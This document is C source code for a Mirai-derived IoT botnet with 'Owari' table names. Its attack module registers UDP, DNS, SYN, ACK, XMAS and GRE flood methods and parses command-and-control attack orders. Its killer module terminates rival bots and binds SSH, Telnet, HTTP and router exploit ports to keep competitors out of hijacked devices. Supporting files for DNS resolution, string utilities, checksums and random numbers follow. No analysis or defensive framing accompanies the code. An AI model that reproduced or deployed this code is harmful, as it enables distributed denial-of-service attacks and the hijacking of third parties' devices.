#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "scanner.h"
uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
BOOL attack_init(void)
{
    int i;
    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_method_udpgeneric);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_method_udpvse);
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_method_udpdns);
	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_method_udpplain);
    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_method_tcpsyn);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_method_tcpack);
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_method_tcpstomp);
    add_attack(ATK_VEC_XMAS, (ATTACK_FUNC)attack_method_tcpxmas);
    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_method_greip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_method_greeth);
    add_attack(ATK_VEC_STD, (ATTACK_FUNC)attack_method_std);
    return TRUE;
}
void attack_kill_all(void)
{
    int i;
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
            kill(attack_ongoing[i], 9);
        attack_ongoing[i] = 0;
    }
    scanner_init();
}
void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;
    if (len < sizeof (uint32_t))
        goto cleanup;
    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);
    if (len == 0)
        goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof (uint8_t);
    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (targs_len == 0)
        goto cleanup;
    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
        goto cleanup;
    targs = calloc(targs_len, sizeof (struct attack_target));
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof (ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof (ipv4_t) + sizeof (uint8_t));
        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }
    if (len < sizeof (uint8_t))
        goto cleanup;
    opts_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof (struct attack_option));
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;
            if (len < sizeof (uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof (uint8_t);
            if (len < sizeof (uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof (uint8_t);
            if (len < val_len)
                goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof (char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }
    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);
    cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}
void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;
    pid1 = fork();
    if (pid1 == -1 || pid1 > 0)
        return;
    pid2 = fork();
    if (pid2 == -1)
        exit(0);
    else if (pid2 == 0)
    {
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    }
    else
    {
        int i;
        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {
                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }
        exit(0);
    }
}
char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;
    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }
    return def;
}
int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);
    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}
uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);
    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}
static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof (struct attack_method));
    method->vector = vector;
    method->func = func;
    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *));
    methods[methods_len++] = method;
}
static void free_opts(struct attack_option *opts, int len)
{
    int i;
    if (opts == NULL)
        return;
    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <linux/ip.h>

#include "includes.h"
#include "checksum.h"

uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for(sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if(count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while(len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if(len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while(sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"
int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;
void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in ssh_bind_addr;
    int ssh_bind_fd;
    struct sockaddr_in tel_bind_addr;
    int tel_bind_fd;
    struct sockaddr_in netis_bind_addr;
    int netis_bind_fd;
    struct sockaddr_in http_bind_addr;
    int http_bind_fd;
    struct sockaddr_in rt_bind_addr;
    int rt_bind_fd;
    struct sockaddr_in hw_bind_addr;
    int hw_bind_fd;
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;
    sleep(5);
    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;
    if (!has_exe_access())
    {
        return;
    }
    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;
        table_unlock_val(OWARI_PROC);
        if ((dir = opendir(table_retrieve_val(OWARI_PROC, NULL))) == NULL)
        {
            break;
        }
        table_lock_val(OWARI_PROC);
    if (killer_kill_by_port(htons(48101)))
    {
        //OG mirai SIP
    }
    if (killer_kill_by_port(htons(1991)))
    {
        //Masuta mirai SIP
    }
    if (killer_kill_by_port(htons(1338)))
    {
        //Sold Josho mirai SIP
    }
    if (killer_kill_by_port(htons(80)))
    {
        //HTTP Server/Some IRC's Use This
    }
    if (killer_kill_by_port(htons(443)))
    {
        //SSL/HTTP/Some IRC's Use This
    }
    if (killer_kill_by_port(htons(4321)))
    {
        //Some IRC's Use This
    }
    if (killer_kill_by_port(htons(6667)))
    {
        //Def IRC 1
    }
    if (killer_kill_by_port(htons(6697)))
    {
        //Def IRC 2
    }
    if (killer_kill_by_port(htons(22)))
    {
        //SSH Port/Bind To
    }
    ssh_bind_addr.sin_port = htons(22);
    tel_bind_addr.sin_port = htons(23);
    netis_bind_addr.sin_port = htons(53413);
    http_bind_addr.sin_port = htons(80);
    hw_bind_addr.sin_port = htons(37215);
    rt_bind_addr.sin_port = htons(52869);
    if ((ssh_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(ssh_bind_fd, (struct sockaddr *)&ssh_bind_addr, sizeof (struct sockaddr_in));
        listen(ssh_bind_fd, 1);
    }
    if (killer_kill_by_port(htons(23)) || killer_kill_by_port(htons(53413)) || killer_kill_by_port(htons(80)) || killer_kill_by_port(htons(52869)) || killer_kill_by_port(htons(37215)))
    {
        //Bind To Telnet, Netis, HTTP, Realtek, and Huawei
    }
    if ((tel_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tel_bind_fd, (struct sockaddr *)&tel_bind_addr, sizeof (struct sockaddr_in));
        listen(tel_bind_fd, 1);
    }
    if ((netis_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(netis_bind_fd, (struct sockaddr *)&netis_bind_addr, sizeof (struct sockaddr_in));
        listen(netis_bind_fd, 1);
    }
    if ((http_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(http_bind_fd, (struct sockaddr *)&http_bind_addr, sizeof (struct sockaddr_in));
        listen(http_bind_fd, 1);
    }
    if ((rt_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(rt_bind_fd, (struct sockaddr *)&rt_bind_addr, sizeof (struct sockaddr_in));
        listen(rt_bind_fd, 1);
    }
    if ((hw_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(hw_bind_fd, (struct sockaddr *)&hw_bind_addr, sizeof (struct sockaddr_in));
        listen(hw_bind_fd, 1);
    }
        while ((file = readdir(dir)) != NULL)
        {
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;
            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);
            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);
            table_unlock_val(OWARI_PROC);
            table_unlock_val(OWARI_EXE);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(OWARI_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(OWARI_EXE, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(OWARI_PROC, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(OWARI_STATUS, NULL));
            table_lock_val(OWARI_PROC);
            table_lock_val(OWARI_EXE);
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0;
                table_unlock_val(OWARI_MEME);
                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(OWARI_MEME, NULL)) != -1)
                {
                    unlink(realpath);
                    kill(pid, 9);
                }
                table_lock_val(OWARI_MEME);
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
                kill(pid, 9);
            } 
            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }

#ifdef DEBUG
    printf("[killer] Finished\n");
#endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(OWARI_PROC);
    table_unlock_val(OWARI_EXE);
    table_unlock_val(OWARI_FOUND);
    table_unlock_val(OWARI_TCP);

    fd = open(table_retrieve_val(OWARI_TCP, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);
    if (util_strlen(inode) == 0)
    {
        table_lock_val(OWARI_PROC);
        table_lock_val(OWARI_EXE);
        table_lock_val(OWARI_FOUND);
        table_lock_val(OWARI_TCP);
        return 0;
    }
    if ((dir = opendir(table_retrieve_val(OWARI_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;
            if (*pid < '0' || *pid > '9')
                continue;
            util_strcpy(ptr_path, table_retrieve_val(OWARI_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(OWARI_EXE, NULL));
            if (readlink(path, exe, PATH_MAX) == -1)
                continue;
            util_strcpy(ptr_path, table_retrieve_val(OWARI_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(OWARI_FOUND, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;
                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(OWARI_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(OWARI_FOUND, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;
                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }
    sleep(1);
    table_lock_val(OWARI_PROC);
    table_lock_val(OWARI_EXE);
    table_lock_val(OWARI_FOUND);
    return ret;
}

static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;
    table_unlock_val(OWARI_PROC);
    table_unlock_val(OWARI_EXE);
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(OWARI_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(OWARI_EXE, NULL));
    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return FALSE;
    }
    close(fd);
    table_lock_val(OWARI_PROC);
    table_lock_val(OWARI_EXE);
    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
    }
    util_zero(path, ptr_path - path);
    return TRUE;
}
static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_route, *m_asswd;
    int m_route_len, m_asswd_len;
    BOOL found = FALSE;
    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;
    table_unlock_val(OWARI_ROUTE);
	table_unlock_val(OWARI_PASSWORD);
    m_route = table_retrieve_val(OWARI_ROUTE, &m_route_len);
	m_asswd = table_retrieve_val(OWARI_PASSWORD, &m_asswd_len);
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_route, m_route_len) ||
		    mem_exists(rdbuf, ret, m_asswd, m_asswd_len))
        {
            found = TRUE;
            break;
        }
    }
    table_lock_val(OWARI_ROUTE);
	table_lock_val(OWARI_PASSWORD);
    close(fd);
    return found;
}
static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;
    if (str_len > buf_len)
        return FALSE;
    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }
    return FALSE;
}
#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "includes.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = util_strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned int jumped = 0, offset;
    *count = 1;
    while(*reader != 0)
    {
        if(*reader >= 192)
        {
            offset = (*reader)*256 + *(reader+1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }
        reader = reader+1;
        if(jumped == 0)
            *count = *count + 1;
    }

    if(jumped == 1)
        *count = *count + 1;
}

struct resolv_entries *resolv_lookup(char *domain)
{
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    // Set up the dns query
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); // Recursion desired
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);
        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n");
#endif
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to call connect on udp socket\n");
#endif
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n", errno);
#endif
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
#ifdef DEBUG
            printf("[resolv] select() failed\n");
#endif
            break;
        }
        else if (nfds == 0)
        {
#ifdef DEBUG
            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
#ifdef DEBUG
            printf("[resolv] Got response from select\n");
#endif
            int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
                continue;

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);
            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                resolv_skip_name(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
                {
                    if (ntohs(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
                        printf("[resolv] Found IP address: %08x\n", (*p));
#endif
                    }

                    name = name + ntohs(r_data->data_len);
                } else {
                    resolv_skip_name(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    close(fd);

#ifdef DEBUG
    printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
#endif

    if (entries->addrs_len > 0)
        return entries;
    else
    {
        resolv_entries_free(entries);
        return NULL;
    }
}

void resolv_entries_free(struct resolv_entries *entries)
{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}

#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

#include "includes.h"
#include "util.h"
#include "table.h"

int util_strlen(char *str)
{
    int c = 0;

    while(*str++ != 0)
        c++;

    return c;
}


BOOL util_strncmp(char *str1, char *str2, int len)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if(l1 < len || l2 < len)
        return FALSE;

    while(len--)
    {
        if(*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

BOOL util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if(l1 != l2)
        return FALSE;

    while(l1--)
    {
        if(*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

int util_strcpy(char *dst, char *src)
{
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

void util_strcat(char *dest, char *src)
{
    while(*dest != '\0')
        *dest++;
    do
    {
        *dest++ = *src++;
    }
    while(*src != '\0');
}

void util_memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while(len--)
        *r_dst++ = *r_src++;
}

void util_zero(void *buf, int len)
{
    char *zero = buf;
    while(len--)
        *zero++ = 0;
}

int util_atoi(char *str, int base)
{
	unsigned long acc = 0;
	int c;
	unsigned long cutoff;
	int neg = 0, any, cutlim;

	do
    {
		c = *str++;
	}
    while(util_isspace(c));
	
    if(c == '-')
    {
		neg = 1;
		c = *str++;
	}
    else if(c == '+')
		c = *str++;

	cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
	cutlim = cutoff % (unsigned long)base;
	cutoff /= (unsigned long)base;
	for(acc = 0, any = 0;; c = *str++)
    {
		if(util_isdigit(c))
			c -= '0';
		else if(util_isalpha(c))
			c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
		else
			break;
            
		if(c >= base)
			break;

		if(any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
			any = -1;
		else
        {
			any = 1;
			acc *= base;
			acc += c;
		}
	}

	if(any < 0)
    {
		acc = neg ? LONG_MIN : LONG_MAX;
	}
    else if(neg)
		acc = -acc;

    return (acc);
}

char *util_itoa(int value, int radix, char *string)
{
    if(string == NULL)
        return NULL;

    if(value != 0)
    {
        char scratch[34];
        int neg = 0;
        int offset = 0;
        int c = 0;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if(radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while(accum)
        {
            c = accum % radix;
            if(c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }

        if(neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i = 0, matched = 0;

    if(mem_len > buf_len)
        return -1;

    for(i = 0; i < buf_len; i++)
    {
        if(buf[i] == mem[matched])
        {
            if(++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

int util_stristr(char *haystack, int haystack_len, char *str)
{
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while(haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if(a == b)
        {
            if(++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

ipv4_t util_local_addr(void)
{
    int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    errno = 0;
    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[util] Failed to call socket(), errno = %d\n", errno);
        #endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);

    return addr.sin_addr.s_addr;
}

char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while(got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

static inline int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

static inline int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

static inline int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

static inline int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}
#define _GNU_SOURCE

#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include "includes.h"
#include "rand.h"
#include "table.h"
#include "util.h"

static uint32_t x, y, z, w;

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

void rand_str(char *str, int len) // Generate random buffer (not alphanumeric!) of length len
{
    while (len > 0)
    {
        if (len >= 4)
        {
            *((uint32_t *)str) = rand_next();
            str += sizeof (uint32_t);
            len -= sizeof (uint32_t);
        }
        else if (len >= 2)
        {
            *((uint16_t *)str) = rand_next() & 0xFFFF;
            str += sizeof (uint16_t);
            len -= sizeof (uint16_t);
        }
        else
        {
            *str++ = rand_next() & 0xFF;
            len--;
        }
    }
}

